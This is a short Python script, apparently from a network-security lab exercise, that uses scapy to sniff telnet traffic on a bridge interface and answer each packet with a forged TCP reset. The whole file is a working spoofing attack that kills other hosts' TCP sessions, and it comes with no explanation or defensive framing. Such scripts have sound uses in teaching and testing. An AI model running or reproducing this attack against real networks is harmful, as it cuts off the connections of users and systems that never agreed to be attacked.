from scapy.all import *
print("Sending reset packet... ")

def spoof_tcp(pkt):
	IPLayer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
	TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, 
				dport=pkt[TCP].sport, sport=pkt[TCP].dport)
	spoofpkt = IPLayer/TCPLayer
	ls(spoofpkt)
	send(spoofpkt, verbose=0)

pkt=sniff(iface='br-2ea3b0bbead9', filter='tcp and port 23', prn=spoof_tcp)
